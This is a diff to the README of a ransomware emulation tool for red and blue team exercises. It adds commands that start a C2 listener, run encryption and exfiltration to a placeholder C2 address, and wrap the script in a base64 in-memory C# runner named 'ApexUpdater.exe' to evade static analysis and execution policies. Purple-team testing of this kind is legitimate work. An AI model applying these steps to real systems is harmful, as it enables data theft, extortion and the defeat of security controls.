@@ -12,7 +12,7 @@
 
 ```
 
-**Apex Pro is a high-fidelity adversary emulation tool designed to replicate the behaviors of modern ransomware families.** It provides a safe, controlled environment to validate detection pipelines, EDR efficacy, and Incident Response (IR) readiness.
+**Apex Pro is a high-fidelity adversary emulation tool designed to replicate the behaviors of modern ransomware families (e.g., LockBit, Conti).** It provides a safe, controlled environment to validate detection pipelines, EDR efficacy, and Incident Response (IR) readiness.
 
 ---
 
@@ -69,8 +69,13 @@ The primary execution module designed for high-fidelity impact simulation.
 Ensure your `.pem` files are in the server directory (they are added to the `.gitignore`).
 
 ```bash
+# Install Dependencies
 pip install -r requirements.txt
+
+# Generate Certificates
 openssl req -x509 -newkey rsa:4096 -keyout apex_key.pem -out apex_cert.pem -sha256 -days 365 -nodes -subj "/CN=localhost"
+
+# Start C2 Listener
 sudo python3 c2_server.py
 
 ```
@@ -80,11 +85,37 @@ sudo python3 c2_server.py
 Generate victim data and launch the simulation phase.
 
 ```powershell
-# Prepare Data
+# [B] Lab Preparation: Generate dummy data
 .\GenerateVictimData.ps1 -RootPath "C:\SimulationData"
 
-# Execute Impact (Theft, Encryption & Exfiltration)
+# [C] Execution Phase 1: Impact (Theft, Encryption & Exfiltration)
 .\ApexSim.ps1 -Mode Encrypt -C2Url "https://<YOUR_C2_IP>/api/v1/telemetry" -TargetPath "C:\SimulationData"
+
+# [C] Execution Phase 2: Recovery (Decryption)
+.\ApexSim.ps1 -Mode Decrypt -TargetPath "C:\SimulationData"
+
+```
+
+### 3. Advanced Execution (C# Wrapper Compilation)
+
+To bypass static analysis and execution policies, the agent is wrapped in a C# runner that executes in memory.
+
+**Step A: Encode the Script (Linux)**
+
+```bash
+base64 -w 0 ApexSim.ps1 > b64_script.txt
+
+```
+
+**Step B: Prepare and Compile (Windows)**
+
+1. Copy the string from `b64_script.txt` into the `encodedScript` variable in `ApexRunner.cs`.
+2. Locate `csc.exe` (usually at `C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe`).
+3. Locate `System.Management.Automation.dll` (usually in the GAC or assembly folder).
+4. Compile the binary:
+
+```powershell
+csc.exe /target:winexe /reference:System.Management.Automation.dll /out:ApexUpdater.exe ApexRunner.cs
 
 ```
 
@@ -97,13 +128,16 @@ Generate victim data and launch the simulation phase.
 | Phase | Technique | Alert Triggered? | TTD (Min) |
 | --- | --- | --- | --- |
 | **Persistence** | T1547.001 | [YES/NO] | [ ] |
+| **Lateral Movement** | T1135 | [YES/NO] | [ ] |
 | **Data Theft** | T1041 | [YES/NO] | [ ] |
 | **Exfiltration** | T1011 | [YES/NO] | [ ] |
 | **Canary Trip** | Honey-pot | [YES/NO] | [ ] |
 | **Encryption** | T1486 | [YES/NO] | [ ] |
+| **Internal Defacement** | T1491.001 | [YES/NO] | [ ] |
+| **Obfuscation** | T1027 | [YES/NO] | [ ] |
 | **Execution** | T1059.001 | [YES/NO] | [ ] |
 
-> **Note:** Use this standardized template to help Blue Teams measure Mean-Time-to-Detection (MTTD) across the kill chain.
+> **Note:** All simulations include a standardized Incident Response (IR) Exercise Template to help Blue Teams measure Mean-Time-to-Detection (MTTD) and Alert effectiveness across every stage of the kill chain.
 
 ---
 
